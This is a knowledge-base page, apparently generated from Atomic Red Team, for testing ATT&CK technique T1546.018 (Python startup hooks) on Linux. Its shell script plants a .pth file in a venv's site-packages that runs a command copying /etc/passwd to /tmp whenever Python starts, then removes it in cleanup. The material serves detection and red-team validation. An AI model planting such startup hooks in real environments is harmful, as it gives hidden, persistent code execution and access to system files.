---
atomic_guid: "a58c066d-f2f0-42a2-ab70-30af73f89e66"
title: "Python Startup Hook - atomic_hook.pth (Linux)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.018"
attack_technique_name: "Event Triggered Execution: Python Startup Hooks"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.018/T1546.018.yaml"
build_date: "2026-04-27 19:12:27"
executor: "sh"
aliases:
  - "a58c066d-f2f0-42a2-ab70-30af73f89e66"
  - "Python Startup Hook - atomic_hook.pth (Linux)"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Executes code by creating atomic_hook.pth in the site-packages directory. 
This script runs automatically for every user on the system when Python starts.

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution#^t1546018-python-startup-hooks|T1546.018: Python Startup Hooks]]

## Input Arguments

### python_exe

- description: The python binary name to test
- type: String
- default: python3

## Dependencies

Python must be installed and the specified binary (#{python_exe}) must be in the PATH.

### Prerequisite Check

```bash
PYTHON_CMD=$(command -v #{python_exe} || command -v python)
if [ -z "$PYTHON_CMD" ]; then exit 1; fi
$PYTHON_CMD -m venv --help >/dev/null 2>&1
```

### Get Prerequisite

```bash
echo "Python not found. Please install Python using your package manager (e.g., Debian Based 'sudo apt-get update && sudo apt-get install -y python3 python3-venv', RedHat / CentOS Based 'sudo yum install -y python3 python3-venv || sudo dnf install -y python3 python3-venv')."
```

## Executor

- elevation_required: False
- name: sh

### Command

```bash
TEMPDIR="/tmp/atomic_sitecust_posix"
mkdir -p "$TEMPDIR"
"#{python_exe}" -m venv "$TEMPDIR/env"
SITE_PACKAGES=$("$TEMPDIR/env/bin/#{python_exe}" -c "import site; print(site.getsitepackages()[0])")
echo "import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')" > "$SITE_PACKAGES/atomic_hook.pth"
ls -la "$SITE_PACKAGES/atomic_hook.pth"
"$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
if [ -f /tmp/atomic_hook_poc.txt ]; then echo "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt not found"; fi
```

### Cleanup

```bash
if [ ! -f /tmp/atomic_hook_poc.txt ] || [ ! -d /tmp/atomic_sitecust_posix ]; then echo "[!] Missing artifact or folder: /tmp/atomic_hook_poc.txt or /tmp/atomic_sitecust_posix — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
rm -rf /tmp/atomic_sitecust_posix
echo "[+] Successful Removed atomic_hook.pth"
rm -rf /tmp/atomic_hook_poc.txt
echo "[+] Successful Removed atomic_hook_poc.txt under /tmp"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.018/T1546.018.yaml)
